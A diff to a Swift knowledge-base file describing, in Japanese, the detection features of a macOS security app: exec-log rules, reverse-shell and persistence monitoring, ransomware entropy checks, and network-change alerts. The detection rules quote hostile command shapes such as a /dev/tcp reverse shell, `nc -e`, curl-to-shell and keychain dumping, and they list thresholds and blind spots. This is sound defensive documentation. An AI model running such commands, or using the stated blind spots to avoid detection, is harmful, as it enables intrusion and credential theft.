@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.9 (build 171).
+// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.12.10 (build 172).
 // The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
 // are not compiled into the shipping app and are overwritten on the next sync.
 // Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
@@ -322,7 +322,7 @@ extension RoamSwitchKnowledgeBase {
                 • 脅威フィード: 1日1回、受信専用で取得（識別子の送信なし）。フィード専用のEd25519鍵で署名検証します（アプリ更新用の鍵とは別）。「自動更新」をオフにすると外部通信ゼロで、同梱データとホモグラフ検知のみで動作します。
                 • 非Pro: モードは保存されますが、遮断は行われません。
                 """,
-                recommendation: "既定の自動ブロックのまま、システム拡張を承認して使うのが最も確実です。社内ツールなどが誤って遮断された場合は、通知の「今回は許可 (5分)」や許可リストで対応してください。"
+                recommendation: "既定の自動ブロックのまま、システム拡張を承認して使うのが最も確実です。社内ツールなどが誤って遮断された場合は、通知の「今回は許可 (5分)」で対応してください。"
             ),
             LocalizedEntry(
                 id: "feat_link_safety_auditor",
@@ -330,6 +330,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "不審なURLをブラウザで開く前に、端末内だけで解析し、Unicodeホモグラフ偽装・サブドメイン偽装・高リスクTLD・平文HTTP・IP直打ちなどから危険度を100点満点で診断します。無料版で利用できます。",
                 details: """
                 • 開き方: メニュー「マルウェア対策」→「🔗 リンクを手動でチェック…」、またはMCPツール `audit_url_safety`。
+                • 防御済み表記: 脅威レポートにある `hxxps://example[.]com` のような書き方のまま貼り付けられます。元のアドレスに戻してから解析します。
                 • ホモグラフ偽装: キリル文字・ギリシャ文字などを使った偽装（Punycode / `xn--`）を検出。
                 • サブドメイン偽装: `apple.com.login-verify.xyz` のように大手ブランド名を紛れ込ませた構造を解析。
                 • 高リスクTLD: `.xyz`、`.top`、`.tk`、`.icu` など、使い捨てのフィッシングで多用されるTLDを減点。
@@ -348,6 +349,7 @@ extension RoamSwitchKnowledgeBase {
                 • 自動対応: ①アプリケーションファイアウォールのロックダウン ②エアギャップ隔離（pfで送受信を全遮断＋Wi-Fi無線オフ、feat_airgap_containment）③共有サービス（SMB / SSH / 画面共有）の停止 ④疑わしいプロセスを強制終了ではなく一時停止（SIGSTOP）⑤緊急通知と最前面の緊急モーダル表示。
                 • 凍結の理由: 通信はすでに遮断されているため、停止したプロセスはそれ以上被害を広げられません。誤検知だった場合は解除時に再開（SIGCONT）でき、データを失いません。
                 • 解除時: ネットワークとWi-Fiを復旧し、停止したプロセスを再開し、改ざんされたおとりファイルを再生成します。
+                • 汎用検知（エントロピー解析、Pro）: おとりファイルに触れない暗号化も、`Documents`・`Desktop`・`Downloads`・`Pictures` に書き込まれたファイルの中身で検知します。ファイル全体のシャノンエントロピーが 7.92 以上のファイルが、5秒以内に20個以上になると、大量暗号化のバーストとして扱います。ファイルの先頭だけ、または4KiB以上のブロックを1つおきに暗号化する方式に備えて、4KiB ごとの区間も調べ、7.9 以上の区間が2つ以上ある16KiB以上のファイルも数えます。ZIP・PDF・JPEG など、圧縮形式の先頭が壊れていないファイルは対象外です。区間の判定は、ビルド成果物（`.o`・`.a`・`.rlib`・`.rmeta`・`.so`・`.dylib`・`.class`・`.pyc`・`.wasm` など）と `target` フォルダ内にも使いません。4KiB より小さいブロック（16バイトや256バイトなど）だけを暗号化する方式は、この判定では見えません。実測では、書類などの実ファイル3,531件に追加の検出はありませんでした。実ファイル150件で、先頭だけ・4KiB以上のブロックを1つおきに暗号化した場合を模擬すると、全体の値では0〜35%、区間の判定では100%を検出しました。
                 • 既定値: Proライセンスの初回有効化時に自動でオン。検知履歴はMCPの `get_canary_status` で確認できます。メニューの「ランサムウェア防護シミュレーション (動作確認)」で安全にテストできます。
                 """,
                 recommendation: "未知のランサムウェアから重要データを守るため、有効のままにしてください。おとりファイル（隠しファイル）は削除しないでください。"
@@ -404,7 +406,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • 仕組み: 特権ヘルパーが `/usr/bin/eslogger exec fork exit` を子プロセスとして起動し、そのJSONストリームを解析します。esloggerはmacOSに同梱のツールで、RoamSwitchはEndpointSecurityエンタイトルメントを使わず申請もしません。そのため実行前ブロックではなく事後の観測です。
                 • 必要条件: macOS 13以降と、フルディスクアクセスでのRoamSwitchの許可。許可がない場合は「実行記録は利用できません: フルディスクアクセスでRoamSwitchの許可が必要です（一覧に無ければ「+」から /Applications/RoamSwitch.app を追加）」(またはesloggerが見つからない旨)と表示するだけで、代わりの常時ポーリングは行いません。記録を有効にする前・ヘルパー起動前のイベントは残りません。
-                • 相関ルール(通知のみ・初期設定では静か・各ルールに固定IDとMITRE ATT&CK技術ID): ブラウザ/Office/メールアプリが直接シェルやスクリプト処理系を起動(exec.shell_from_app, T1059)／/tmp・/private/var/tmpや隔離属性付きの場所から署名なし・アドホック署名のバイナリを実行(exec.untrusted_location, T1204.002)／curl/wgetをシェルへ渡す `sh -c` ワンライナーのうち、生IPのURL・base64・eval・TLS検証無効・ブラウザ等が親といった不審な事情を伴うもの(exec.pipe_to_shell, T1059.004)／`osascript -e` でdo shell scriptとbase64/evalを組み合わせたもの(exec.osascript_obfuscated, T1059.002)／`xattr -d com.apple.quarantine` の後15分以内にそのファイルを実行(exec.quarantine_stripped_then_exec, T1553.001)／直近24時間に書き込まれたLaunchAgent/LaunchDaemonから署名なし・アドホックのバイナリがlaunchd経由で起動(exec.launchd_untrusted_binary, T1543.001/.004)／Apple署名でないシェル以外の祖先プロセスによる `security find-generic-password -w` や `dump-keychain`(exec.keychain_access, T1555.001)／osascript以外の裸のインタプリタが `-c`/`-e`/`-Command` のインライン一行コードを実行し、base64/evalとダウンロードやexec相当の呼び出しを組み合わせたもの(exec.interpreter_inline_obfuscated, T1059)／DYLD_INSERT_LIBRARIESを設定した非Apple署名バイナリの実行(exec.dyld_insert_libraries, T1574.006)／RoamSwitch自身でもAppleのプロセスでもない何かによる`tmutil deletelocalsnapshots`/`thinlocalsnapshots`の実行(exec.ransomware_recovery_tampering, T1490)／コマンドラインが、RoamSwitchの設置した偽の認証情報ファイル(~/.aws/credentials、~/.env.backupなど中身にマーカーを持つもの)を直接指定して実行(exec.honeytoken_path, T1552.001)。本物のファイルは対象外で、ライブラリ経由の読み取りはハニートークンの監視が担当。スクリプトやAIエージェントが動かす攻撃ツール連鎖(HexStrike AIのようなバックエンドなど)を狙う規則も2つあります。1つのプロセスが30秒以内に8種類以上のペネトレーションテスト用ツールをwhich/typeで立て続けに調べる場合(exec.offensive_tool_inventory, T1595)と、スクリプト処理系やAIコーディングエージェントが2分以内に3種類以上の同種ツールを起動する場合(exec.offensive_tool_burst, T1595)です。人がTerminalで同じコマンドを打っても検知しません。Terminalで普通に打った `curl | sh` は意図的に検知しません。
+                • 相関ルール(通知のみ・初期設定では静か・各ルールに固定IDとMITRE ATT&CK技術ID): ブラウザ/Office/メールアプリが直接シェルやスクリプト処理系を起動(exec.shell_from_app, T1059)／/tmp・/private/var/tmp・/var/folders配下の一時フォルダ・/Users/Sharedや隔離属性付きの場所から署名なし・アドホック署名のバイナリを実行(exec.untrusted_location, T1204.002)／curl/wgetをシェルへ渡す `sh -c` ワンライナーのうち、生IPのURL・base64・eval・TLS検証無効・ブラウザ等が親といった不審な事情を伴うもの(exec.pipe_to_shell, T1059.004)／`osascript -e` でdo shell scriptとbase64/evalを組み合わせたもの(exec.osascript_obfuscated, T1059.002)／`xattr -d com.apple.quarantine` の後15分以内にそのファイルを実行(exec.quarantine_stripped_then_exec, T1553.001)／直近24時間に書き込まれたLaunchAgent/LaunchDaemonから署名なし・アドホックのバイナリがlaunchd経由で起動(exec.launchd_untrusted_binary, T1543.001/.004)／Apple署名でないシェル以外の祖先プロセスによる `security find-generic-password -w` や `dump-keychain`(exec.keychain_access, T1555.001)／osascript以外の裸のインタプリタが `-c`/`-e`/`-Command` のインライン一行コードを実行し、base64/evalとダウンロードやexec相当の呼び出しを組み合わせたもの(exec.interpreter_inline_obfuscated, T1059)／DYLD_INSERT_LIBRARIESを設定した非Apple署名バイナリの実行(exec.dyld_insert_libraries, T1574.006)／RoamSwitch自身でもAppleのプロセスでもない何かによる`tmutil deletelocalsnapshots`/`thinlocalsnapshots`の実行(exec.ransomware_recovery_tampering, T1490)／コマンドラインが、RoamSwitchの設置した偽の認証情報ファイル(~/.aws/credentials、~/.env.backupなど中身にマーカーを持つもの)を直接指定して実行(exec.honeytoken_path, T1552.001)。本物のファイルは対象外で、ライブラリ経由の読み取りはハニートークンの監視が担当。スクリプトやAIエージェントが動かす攻撃ツール連鎖(HexStrike AIのようなバックエンドなど)を狙う規則も2つあります。1つのプロセスが30秒以内に8種類以上のペネトレーションテスト用ツールをwhich/typeで立て続けに調べる場合(exec.offensive_tool_inventory, T1595)と、スクリプト処理系やAIコーディングエージェントが2分以内に3種類以上の同種ツールを起動する場合(exec.offensive_tool_burst, T1595)です。人がTerminalで同じコマンドを打っても検知しません。Terminalで普通に打った `curl | sh` は意図的に検知しません。 シェルの `-c` で渡されたコマンドラインや、nc・ncat・socatを直接起動したコマンドラインに、リバースシェル(バインドシェルを含む)の形が書かれている場合も検知します(exec.reverse_shell_argv, T1059.004)。対象は、シェルを運ぶ /dev/tcp・/dev/udp へのリダイレクト、mkfifoで作ったパイプをnc・telnet・openssl s_client・sshにつなぐ形、`nc -e <シェル>`、socatの exec:<シェル>、シェルへパイプで渡すopenssl s_clientです。`echo > /dev/tcp/host/22` のようなポートの疎通確認や、これらの語を文字として含むだけの文は検知しません。
                 • 通知: 通知(Pro)とインシデントタイムラインへの記録(発生源 execRecorder、対応「通知のみ」)。通知が単独でAir-Gapなどの隔離を発動することはありません。
                 • 保存: /Library/Application Support/RoamSwitch/exec_log にセグメント分割のJSON Lines(root専用の0700/0600。コマンドライン引数に機密が含まれ得るため、アプリ・ビューア・MCPサーバーは特権ヘルパー経由でのみ読み取ります)。既定200MB・14日(変更可)、クラッシュ安全なローテーション。セグメント間をハッシュチェーンで連結し、削除・編集・切り詰めを検出します(「チェーンを検証」)。改ざん検知であり改ざん防止ではありません。環境変数は記録しませんが、コマンドライン引数に機密が含まれる場合があります。
                 • 負荷対策: 過負荷時は古い行から捨てる有界キュー(件数を表示)、指数バックオフでの再起動、オフにするとesloggerを完全に停止します。
@@ -415,14 +417,16 @@ extension RoamSwitchKnowledgeBase {
             LocalizedEntry(
                 id: "feat_persistence_monitor_guard",
                 title: "新規の自動起動登録（LaunchAgent / LaunchDaemon）の監視 (Pro)",
-                summary: "新しい LaunchAgent / LaunchDaemon の登録をリアルタイムに監視し、シェルやスクリプトインタプリタを直接起動する登録や、署名が無効な実行ファイルを登録したものを検知して通知します。",
+                summary: "新しい LaunchAgent / LaunchDaemon の登録をリアルタイムに監視し、シェルやスクリプトインタプリタを直接起動する登録や、署名が無効な実行ファイルを登録したものを検知して通知します。あわせて、シェルの起動ファイルなど、自動で実行される場所に不審な行が現れたときも通知します。",
                 details: """
                 • 監視対象: `~/Library/LaunchAgents`、`/Library/LaunchAgents`、`/Library/LaunchDaemons` を FSEvents で監視（約1.5秒のデバウンス）。
                 • 判定: 近年の情報窃取マルウェアは、正規署名済みの `/bin/bash` や `/usr/bin/osascript` にBase64で隠したスクリプトを実行させて永続化します。インタプリタ自体の署名は正しいため、生のインタプリタを直接起動する登録は署名に関係なく不審として扱い、スクリプト引数も静的シグネチャで検査します。署名が無効・未署名の実行ファイルも検知対象です。Homebrew services のラッパーは除外します。
                 • 検知のみ: EndpointSecurityのエンタイトルメントを使わないため、plistの書き込み自体は止められません。書き込みから約1.5秒以内に判定して通知します。
+                • 監視対象（自動で実行される場所）: シェルの起動ファイル（`~/.zshrc`、`~/.zshenv`、`~/.zprofile`、`~/.zlogin`、`~/.zlogout`、`~/.bashrc`、`~/.bash_profile`、`~/.bash_login`、`~/.profile`、`~/.bash_logout`、`~/.config/fish/config.fish`、`/etc/zshrc`、`/etc/zshenv`、`/etc/zprofile`、`/etc/zlogin`、`/etc/profile`、`/etc/bashrc`）、`~/.ssh/rc` と `/etc/ssh/sshrc`、定期スクリプト（`/etc/periodic/{daily,weekly,monthly}`、`/usr/local/etc/periodic/*`、`/etc/{daily,weekly,monthly}.local`。存在する場合のみ）、gitフックの置き場（`~/.git-templates/hooks`、`~/.config/git/hooks`）、ログイン/ログアウトフック（`/Library/Preferences/com.apple.loginwindow.plist` の LoginHook / LogoutHook）、フォルダアクションのスクリプト（`~/Library/Scripts/Folder Action Scripts` と `/Library/Scripts/Folder Action Scripts`。コンパイル済みのAppleScriptは osadecompile で読み、`.scptd` バンドルは読みません）。5秒ごとに確認し、最初の1回は今ある内容を記録するだけで通知しません。`emond` は対象外です。
+                • 判定（上の場所）: リバースシェル、復号してそのまま実行、ダウンロードしてそのまま実行、一時フォルダ（`/tmp`・`/var/folders` など）にあるプログラムの実行の形をした行だけを通知します。普通の行が増えても通知しません。シェルの起動ファイル・`~/.ssh/rc`・gitフックは持ち主が頻繁に編集するため、元からあった不審な行は通知せず、新しく増えた行だけを通知します。ログイン/ログアウトフックは、設定されたこと自体を通知します。
                 • 既定値: Pro版で既定オン。メニュー「マルウェア対策」→「新規の自動起動登録(LaunchAgent/Daemon)を監視 (Pro)」で切替。
                 """,
-                recommendation: "見慣れない自動起動登録の通知が来たら、通知に表示されたplistの内容を確認し、心当たりがなければ削除してください。正規アプリのインストール直後であれば問題ありません。"
+                recommendation: "見慣れない自動起動登録の通知が来たら、通知に表示されたplistの内容を確認し、心当たりがなければ削除してください。正規アプリのインストール直後であれば問題ありません。 起動ファイルなどの通知なら、通知に表示された行を確認し、心当たりがなければその行を削除してください。"
             ),
             LocalizedEntry(
                 id: "feat_docker_event_guard",
@@ -437,6 +441,43 @@ extension RoamSwitchKnowledgeBase {
                 """,
                 recommendation: "Dockerを開発で使う場合は、コンテナ脱出リスクの早期発見のために有効化を推奨します。"
             ),
+            LocalizedEntry(
+                id: "feat_reverse_shell_watch",
+                title: "リバースシェルの常時検知 (Pro)",
+                summary: "ログイン中のユーザーのシェルやインタプリタの入力と出力が、外部サーバーへのTCP接続になっていないかを数秒ごとに調べ、リバースシェルの疑いを通知します。Pro版で、標準でオンです。",
+                details: """
+                • 開き方: メニューバーの「🐚/✅ リバースシェルを常時監視 (Pro)」で切り替えます。
+                • 仕組み: libprocでプロセスの一覧と、各プロセスが開いているファイル記述子を4秒ごとに読みます。lsofなどの外部コマンドは使わず、接続の中身は読みません。
+                • 検知する形: (1) シェルやインタプリタ(sh、bash、zsh、python、perl、ruby、php、nodeなど)の入力(0番)と出力(1番)が、同じ「確立済みの外向きTCP接続」になっている形(`bash -i >& /dev/tcp/H/P 0>&1` や、pythonでソケットをdup2する1行)。(2) nc、ncat、socatが`-e`や`--exec`、`exec:`で別のプログラムを接続につないでいる形。(3) ncの脇に、入力と出力がパイプのシェルが同じ親から起動されている形(`mkfifo`を使う輪。Mac標準のncには`-e`がないため、この形が使われます)。
+                • 見る相手: 公開アドレスだけです。家庭内LAN、Tailscale(100.64.0.0/10)、コンテナ、ループバックは見ません。リモート開発やProxyCommandでの誤検知を避けるためです。
+                • 外向きの判定: 待ち受けポートで受けた接続や、手元のポートが49152未満の接続は、リバースシェルとは見なしません。
+                • 通知の条件: 2回続けて同じ状態を見たときだけ通知し、1つのプロセスにつき1回です。同じ名前のプログラムが同じ相手につながる通知は、15分に1回までです。
+                • 通知のみ: プロセスの終了も、ネットワークの遮断も自動では行いません。
+                • 限界: ログイン中のユーザー自身のプロセスだけが対象です。root権限のプロセスは見えません。一覧にない名前のプログラムや、プライベートアドレスへの接続も見ません。スクリプトファイルに書かれただけのものは、接続するまで見えません。
+                • 許可リスト: 心当たりのあるプログラムは、メニューの「直近のリバースシェル検知を許可リストに追加…」で「名前@接続先」として追加できます。
+                • プロセス実行レコーダー(feat_exec_recorder)の`exec.reverse_shell_argv`は、コマンドラインに書かれた形を起動時に検知します。この機能は、接続した後の実際の状態を検知します。
+                • Proのライセンスを失うと自動で無効になります。
+                """,
+                recommendation: "通知が出たら、プログラムのパスと親プロセスを確認してください。心当たりがなければ、プロセスを終了し、ネットワークを切断してから調べてください。"
+            ),
+            LocalizedEntry(
+                id: "feat_network_settings_watch",
+                title: "ネットワーク設定の変化の監視 (偽DHCP・WPAD対策, Pro)",
+                summary: "接続中のネットワークが配ったDNSサーバー、ルーター、プロキシ自動構成(PAC)を、同じネットワークの前回の状態と比べ、違いがあれば通知します。偽のDHCPサーバーやWPADを使った中間者攻撃の手がかりです。Pro版で、標準でオンです。",
+                details: """
+                • 開き方: メニューバーの「🌐/✅ ネットワーク設定の変化を監視 (Pro)」で切り替えます。
+                • 仕組み: macOSのシステム構成ストア(SCDynamicStore)の変化を受け取り、数秒待ってから、有線とWi-Fi(enインターフェース)のDNSとルーターを読みます。外部コマンドも通信も使いません。
+                • 比べる相手: Wi-Fiは名前(SSID)、名前を読めないときと有線はルーターのハードウェアアドレスで、ネットワークを見分けます。初めて見たネットワークは覚えるだけで、通知しません。
+                • 通知する変化: (1) そのネットワークで見たことのないDNSサーバー。ルーター自身のアドレス、公開DNSとして知られたもの、RoamSwitchのセキュアDNSは除きます。(2) 見たことのないルーターと、見たことのないDNSサーバーが同時に現れた場合。偽のDHCPサーバーが配る形なので、より強い通知になります。(3) 見たことのないホストのプロキシ自動構成(PAC)。(4) 「プロキシを自動検出」(WPAD)が新しくオンになった場合。 ルーター自身のアドレスを除くのは、そのルーターがすでに既知のときだけです。新しいルーターが自分のアドレスをDNSサーバーとして配った場合は、新しいルーターと新しいDNSサーバーの組として、強い通知になります。
+                • 通知しないもの: ルーターだけが変わった場合は覚えるだけです(交換はよくあり、ゲートウェイの変化はネットワーク履歴とARP監視が見ます)。VPN、Tailscaleなどのトンネル(utunなど)は見ません。サービス設定に保存されたDNS(本人、構成プロファイル、RoamSwitchのセキュアDNSが設定したもの)は、ネットワークが配ったものではないので比べません。DNS-over-HTTPSのプロファイルは、ここに現れません。ルーターが3種類以上見えたネットワーク(学内や社内のように場所ごとにサブネットが違う)では、新しいルーターを普通のこととして扱います。
+                • 受け入れ: 同じ内容の通知は1回だけです。ルーターの交換のように心当たりのある変化は、メニューの「ネットワーク設定の基準を現在の状態に更新…」で、今の状態をそのネットワークの正しい状態として記録します。自動では受け入れません。
+                • 監査との関係: 監査項目「プロキシ自動検出 (WPAD / PAC)」(proxy_autodiscovery)は、今この瞬間にWPADやネットワークが指定したPACが有効かを調べます。
+                • 通知のみ: 設定の変更も遮断もしません。
+                • 限界: 偽のDHCPサーバーそのものは見えず、結果の違いだけが手がかりです。前回と同じDNSとルーターを配る偽サーバーは見つけられません。macOSにLLMNRはありません。NetBIOS名前サービス(netbiosd)はmacOSにありますが、その応答の改ざんは監視していません。mDNS(Bonjour)は仕様どおりの機能なので、検知の対象にしていません。
+                • Proのライセンスを失うと自動で無効になります。
+                """,
+                recommendation: "通知が出たら、ネットワーク名と、表示されたDNSサーバーやルーターを確認してください。ルーターやプロバイダーを変えたなら受け入れ、心当たりがなければ、そのネットワークの利用を止めてください。"
+            ),
         ]
     }
 
@@ -449,9 +490,9 @@ extension RoamSwitchKnowledgeBase {
                 title: "重要システムファイルの改ざん監視（Critical Path FIM） (Pro)",
                 summary: "sudoers・SSH設定・PAM・hosts など、正規のOS更新やアプリのインストールではほとんど変わらない重要ファイルのSHA-256ベースラインを記録し、変更・削除・新規追加を検知して通知します。",
                 details: """
-                • 対象: `/etc/sudoers`、`/etc/pam.d/sudo`、`/etc/ssh/sshd_config`、`/etc/ssh/sshd_config.d/` 配下、`/etc/hosts`、rootの `~/.ssh/authorized_keys`。root権限でしか読めないため、特権ヘルパーがハッシュを計算します。
+                • 対象: `/etc/sudoers`、`/etc/sudoers.d/` 配下、`/etc/pam.d/` 配下、`/etc/ssh/sshd_config`、`/etc/ssh/sshd_config.d/` 配下、`/etc/hosts`、rootの `~/.ssh/authorized_keys`。root権限でしか読めないため、特権ヘルパーがハッシュを計算します。
                 • 検知タイミング: `/etc`・`/etc/pam.d`・`/etc/ssh` の FSEvents でほぼリアルタイムに再スキャンし、1時間ごとの定期スキャンで取りこぼしを補います。
-                • ベースライン: 初回スキャン時の状態を記録。改ざんを検知しても自動で新しいベースラインとして採用しないため、人が確認するまで検知状態が続きます（同じ状態についての通知はアプリ起動中は繰り返しません。さらに変更があれば再通知）。
+                • ベースライン: 初回スキャン時の状態を記録。ファイルの変更と、追加ファイル（`/etc/sudoers.d/` と `/etc/ssh/sshd_config.d/` 配下、`/etc/pam.d/sudo_local`）以外の削除は、検知しても自動で新しいベースラインとして採用しないため、人が確認するまで検知状態が続きます（同じ状態についての通知はアプリ起動中は繰り返しません。さらに変更があれば再通知）。新規追加のファイルは1回通知したあと、ベースラインに加えます。削除された追加ファイルも1回通知したあと、ベースラインから外します。 sudoでTouch IDを有効にすると `/etc/pam.d/sudo_local` が作られ、新規追加として1回だけ通知されます。無効にして削除したときも1回だけ通知されます。 確認したら、「マルウェア対策」→「重要ファイルの基準を現在の状態に更新…」で、変更・削除・新規追加の一覧を見て基準を更新できます。
                 • 監視停止の警告: ヘルパーに3回連続で接続できない場合は、改ざん検知が機能していないことを通知します。
                 • 補足: リンク保護がhostsフォールバックで動作している間は、RoamSwitch自身が `/etc/hosts` の管理セクションを書き換えることがあります。LaunchAgent / Daemon は feat_persistence_monitor_guard が担当します。
                 • 既定値: Proライセンスの初回有効化時に自動でオン。メニュー「マルウェア対策」→「重要システムファイルの改ざんを定期監視 (Pro)」。
@@ -504,7 +545,7 @@ extension RoamSwitchKnowledgeBase {
                 details: """
                 • 開き方: メニュー「Macセキュリティ総合診断」→「📈 セキュリティアクティビティログ…」。
                 • データソース: 封じ込めインシデント履歴(feat_containment_incident_timeline、最新200件)と、メール添付ダウンロード保護(feat_webmail_download_guard)で確定したマルウェア検知を統合した一覧です。
-                • フィルタ: カテゴリ(ARPスプーフィング・おとりファイル・XProtect連動Air-Gap・ポート異常・ClickFix・実行記録・エントロピー検知・ハニートークン・ブラウザ認証情報監視・危険なダウンロード)、重要度(すべて/info/warning/critical)、期間(過去24時間・過去3日間・過去7日間・すべての期間)、フリーテキスト検索(概要・詳細・カテゴリ名を対象に大文字小文字を区別せず部分一致)。
+                • フィルタ: カテゴリ(ARPスプーフィング・おとりファイル・XProtect連動Air-Gap・ポート異常・ClickFix・実行記録・エントロピー検知・ハニートークン・ブラウザ認証情報監視・リバースシェル検知・ネットワーク設定の変化の監視・危険なダウンロード)、重要度(すべて/info/warning/critical)、期間(過去24時間・過去3日間・過去7日間・すべての期間)、フリーテキスト検索(概要・詳細・カテゴリ名を対象に大文字小文字を区別せず部分一致)。
                 • 時系列グラフ: 選択した期間の検知件数を棒グラフで表示します。期間が72時間以内なら1時間単位、それを超えると1日単位に自動で切り替わります。バーをクリックするとその時間帯だけに絞り込め、もう一度クリックすると解除されます。
                 • 表示件数: 最新500件まで一覧表示(超過時は件数と絞り込みを促すメッセージを表示)。
                 • エクスポート: CSVエクスポート(Pro)。
@@ -586,6 +627,7 @@ extension RoamSwitchKnowledgeBase {
                 • 列挙対象: node_modules直下1階層（@scope/パッケージはさらに1階層）のpackage.jsonに宣言されたpreinstall/install/postinstall/prepareスクリプト。ネストしたnode_modulesへは降りません。
                 • 危険パターンの参考表示: curl|sh・wget|sh・eval(・base64 -d・node -eに一致するコマンドには⚠️を表示しますが、これは軽量ヒューリスティックによる参考情報で、多くの正規スクリプト（ネイティブモジュールのビルド等）も該当します。
                 • ネットワーク接続は一切行わず、スクリプトを実行することもありません。純粋な静的一覧表示です。
+                • 確認済みの状態との差分: 「今の状態を確認済みにする」を押すと、そのときのパッケージの状態（スクリプトの内容はハッシュだけ、コンパイル済みコードの有無）を記録します。次の一覧取得から、それ以降にインストール時に動くコードが増えたパッケージを示します: スクリプトの追加、スクリプトの内容の変更、コンパイル済みコードの追加（`binding.gyp`、`.node`・`.so`・`.dylib`・`.dll`、実行ファイル）、これらを持つ新しいパッケージ。消えたスクリプトやパッケージは示しません。確認済みにできるのは人だけで、一覧取得も MCP ツールも確認済みにしません（MCP の結果には `drift` と `baselineAcceptedAt` が付きます）。記録は `~/Library/Application Support/RoamSwitch/package_install_baseline.json`（権限 0600）です。
                 • MCPツール: `run_package_lifecycle_script_scan`（`watchedFolders`引数、Pro限定）。
                 """,
                 recommendation: "⚠️マークの付いたスクリプトは、そのパッケージが本当に必要とする処理かを個別に確認してください。見慣れないパッケージのpostinstallは特に注意が必要です。"
@@ -631,6 +673,18 @@ extension RoamSwitchKnowledgeBase {
                 recommendation: "⚠️の付いた依存関係は、実際にタイプミスでないか個別に確認してください。見慣れないパッケージ名は特に注意が必要です。"
             ),
             LocalizedEntry(
+                id: "feat_dependency_source_scan",
+                title: "依存関係の取得元の検査 (pip / npm、Pro)",
+                summary: "プロジェクトのファイルを読み、依存関係の混乱(同じ名前の公開パッケージが非公開パッケージの代わりに入ること)を許す設定を探します。pip の extra-index-url と、.npmrc で固定されていない非公開レジストリ由来の npm スコープが対象です。",
+                details: """
+                • 報告する内容: ①`pip_extra_index_url` — requirements*.txt、pip.conf、pyproject.toml、uv.toml にある `--extra-index-url` / `extra-index-url` の行。pip はその取得元と PyPI の両方を探して最も高い版を選ぶため、同じ名前で版の高い公開パッケージが選ばれます。②`npm_scope_not_pinned` — npm のロックファイル(package-lock.json、npm-shrinkwrap.json、yarn.lock v1、pnpm-lock.yaml)が、@スコープのパッケージを npmjs.org 以外のレジストリから入れているのに、プロジェクト内、登録フォルダまでの上位フォルダ、ホームフォルダのどの .npmrc にも `@スコープ:registry=` の指定がない場合。
+                • しないこと: レジストリへ名前が取得可能かを問い合わせることはなく、ネットワーク通信も実行もしません。結果は設定への警告で、攻撃が成立する証拠ではありません。それらの名前が非公開の取得元にしか存在しない場合でも一覧には出ます。URL に含まれる認証情報は捨て、ホスト名だけを表示します。
+                • 対象外: 非公開レジストリ由来のスコープなし npm パッケージ(.npmrc では固定できません)、yarn Berry のロックファイル(取得元を記録しません)、Poetry の source、uv の `[[tool.uv.index]]`、http(s) 以外の index URL。
+                • 開き方: 「📦 パッケージCVE照合」→「依存関係の取得元 (Pro)」タブ。「依存関係」タブと同じプロジェクトフォルダを対象にします。MCP: `run_dependency_source_scan`(`watchedFolders`引数、Pro限定)。
+                """,
+                recommendation: "pip は `--extra-index-url` の代わりに、PyPI をミラーした非公開の取得元を1つだけ `--index-url` で指定する構成を勧めます。npm は非公開スコープごとに、プロジェクトの .npmrc へ `@スコープ:registry=<自分のレジストリ>` を追加してください。"
+            ),
+            LocalizedEntry(
                 id: "feat_port_scan_guard",
                 title: "着信ポートスキャン検知 (自動遮断, Pro)",
                 summary: "短時間(5分間)に多数の異なるポート(15件以上)へ接続してきた送信元IPを検知して通知します(nmap/masscan等の偵察行為の典型的な特徴)。検知したスキャン元は既定で10分間、自動的に遮断されます。Pro版限定。",
@@ -671,15 +725,15 @@ extension RoamSwitchKnowledgeBase {
             ),
             LocalizedEntry(
                 id: "feat_security_health_checker",
-                title: "Macセキュリティ総合診断（18項目・スコア & 改善手順）",
-                summary: "システム堅牢性・ネットワーク防御・認証とアクセス制御・ポート露出・マルウェア対策・物理デバイス防御の6分野18項目を検査し、100点満点のスコア・ランクと改善手順を表示します。無料版で利用できます。",
+                title: "Macセキュリティ総合診断（21項目・スコア & 改善手順）",
+                summary: "システム堅牢性・ネットワーク防御・認証とアクセス制御・ポート露出・マルウェア対策・物理デバイス防御の6分野21項目を検査し、100点満点のスコア・ランクと改善手順を表示します。無料版で利用できます。",
                 details: """
-                • システム堅牢性: 1. FileVault、2. SIP（システム完全性保護）、3. Gatekeeper、4. 自動セキュリティアップデート、5. Apple XProtect。
-                • ネットワーク防御: 6. macOS ファイアウォール、7. ステルスモード、8. Wi-Fi 暗号化強度、9. ARP スプーフィング監視、10. ゲートウェイ ARP 固定。
-                • 認証・アクセス制御: 11. SSH リモートログイン設定（rootログイン禁止・鍵認証必須か）、12. Sudo 権限昇格設定（`NOPASSWD` の監査）。
-                • サービス・ポート露出: 13. 外部公開ポート。
-                • マルウェア・ダウンロード保護: 14. Web・メール保護、15. DNS脅威保護、16. フィッシング・悪質リンク保護（Safariの詐欺Webサイト警告）。
-                • 物理ポート・デバイス防御: 17. 不正USB / BadUSB 物理ポートガード、18. macOS アクセサリ接続保護。
+                • システム堅牢性: 1. FileVault、2. SIP（システム完全性保護）、3. Gatekeeper、4. 自動セキュリティアップデート、5. Apple XProtect、6. バックアップ（Time Machineの最終バックアップが7日以内か。復元できるかは確認しません）。
+                • ネットワーク防御: 7. macOS ファイアウォール、8. ステルスモード、9. Wi-Fi 暗号化強度、10. ARP スプーフィング監視、11. ゲートウェイ ARP 固定、12. プロキシ自動検出 (WPAD / PAC)。
+                • 認証・アクセス制御: 13. SSH リモートログイン設定（rootログイン禁止・鍵認証必須か）、14. Sudo 権限昇格設定（`NOPASSWD` の監査）、15. AIエージェントの認証情報ファイル。
+                • サービス・ポート露出: 16. 外部公開ポート。
+                • マルウェア・ダウンロード保護: 17. Web・メール保護、18. DNS脅威保護、19. フィッシング・悪質リンク保護（Safariの詐欺Webサイト警告）。
+                • 物理ポート・デバイス防御: 20. 不正USB / BadUSB 物理ポートガード、21. macOS アクセサリ接続保護。
                 • 対象外の扱い: 信頼ネットワークでのファイアウォール・ステルス、リモートログイン無効時のSSH、ヘルパー未接続時のSudo監査は、N/Aとしてスコア計算から除外します。
                 • ランク: 100点 = S、85〜99点 = A、70〜84点 = B、70点未満 = C。MCPツール `get_security_report` でも取得できます。
                 """,
